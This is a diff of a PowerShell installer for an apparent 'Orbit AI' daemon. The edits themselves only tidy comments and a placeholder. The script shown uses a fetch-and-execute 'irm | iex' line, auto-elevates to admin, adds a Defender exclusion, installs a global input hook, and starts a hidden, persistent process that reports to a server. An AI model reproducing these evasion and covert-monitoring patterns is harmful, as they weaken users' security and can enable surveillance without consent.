@@ -1,5 +1,5 @@
 # Orbit AI - Windows Installer v3
-# Usage: irm 'https://서버/setup/install.ps1' | iex
+# Usage: irm 'https://SERVER/setup/install.ps1' | iex
 # Token optional: $env:ORBIT_TOKEN='xxx'; irm '...' | iex
 
 $ErrorActionPreference = "Continue"
@@ -27,7 +27,7 @@ trap {
   Pause-Exit 1
 }
 
-# ── Admin auto-elevate ──
+# -- Admin auto-elevate --
 $_isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $_isAdmin) {
   Write-Host "  Elevating to admin..." -ForegroundColor Yellow
@@ -57,9 +57,9 @@ Write-Host "  User     : $env:USERNAME" -ForegroundColor Cyan
 Write-Host "  Server   : $REMOTE" -ForegroundColor Cyan
 Write-Host ""
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 # Step 0: Clean up previous installation
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 Write-Host "  [0/8] Cleaning previous installation..." -ForegroundColor Cyan
 
 # Kill existing daemon processes
@@ -90,9 +90,9 @@ if (Test-Path "$env:USERPROFILE\.orbit-config.json") {
 }
 Write-Host "  Previous installation cleaned" -ForegroundColor Green
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 # Step 1-2.5: Install dependencies (Node, Git, Python, Java, Defender)
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 Write-Host "  [1/8] Checking Node.js..." -ForegroundColor Cyan
 $NodePath = (Get-Command node -ErrorAction SilentlyContinue).Source
 if (-not $NodePath) {
@@ -159,9 +159,9 @@ try {
   Add-MpPreference -ExclusionProcess "node.exe" -ErrorAction SilentlyContinue
 } catch {}
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 # Step 3: Download source
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 Write-Host "  [3/8] Downloading source..." -ForegroundColor Cyan
 if (Test-Path "$DIR\.git") {
   Set-Location $DIR
@@ -181,9 +181,9 @@ if (Test-Path "$DIR\.git") {
 }
 Set-Location $DIR
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 # Step 4: npm install
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 Write-Host "  [4/8] Installing packages..." -ForegroundColor Cyan
 if (-not (Test-Path "$DIR\node_modules\uiohook-napi")) {
   npm install --silent 2>&1 | Out-Null
@@ -191,9 +191,9 @@ if (-not (Test-Path "$DIR\node_modules\uiohook-napi")) {
 if (Test-Path "$DIR\node_modules") { Write-Host "  Packages ready" -ForegroundColor Green }
 else { Write-Host "  [WARN] node_modules missing" -ForegroundColor Yellow }
 
-# ══════════════════════════════════════════════════════════════════════════════
-# Step 5: Save config — NO TOKEN REQUIRED
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+# Step 5: Save config - NO TOKEN REQUIRED
+# ==============================================================================
 Write-Host "  [5/8] Saving config..." -ForegroundColor Cyan
 
 # Token: env var > old config > empty (all optional)
@@ -210,9 +210,9 @@ $cfg = @{
 [System.Environment]::SetEnvironmentVariable("ORBIT_SERVER_URL", $REMOTE, "User") 2>$null
 Write-Host "  Config saved (hostname: $env:COMPUTERNAME)" -ForegroundColor Green
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 # Step 6: Register startup (Task Scheduler with auto-restart)
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 Write-Host "  [6/8] Registering startup..." -ForegroundColor Cyan
 
 $nodeExePs1 = if ($NodePath) { $NodePath -replace '\\', '\\\\' } else { '' }
@@ -278,9 +278,9 @@ if (-not $taskRegistered) {
   Write-Host "  Startup folder registered (fallback)" -ForegroundColor Yellow
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 # Step 7: Start daemon
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 Write-Host "  [7/8] Starting daemon..." -ForegroundColor Cyan
 Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NonInteractive -ExecutionPolicy Bypass -File `"$ps1Path`""
 Start-Sleep -Seconds 5
@@ -293,9 +293,9 @@ if ($newPid -and (Get-Process -Id $newPid -ErrorAction SilentlyContinue)) {
   Write-Host "  Daemon starting... (will auto-start on login)" -ForegroundColor Yellow
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 # Step 8: Self-test (5 checks)
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 Write-Host "  [8/8] Self-test..." -ForegroundColor Cyan
 $testPass = 0; $testFail = 0; $regResult = $null
 
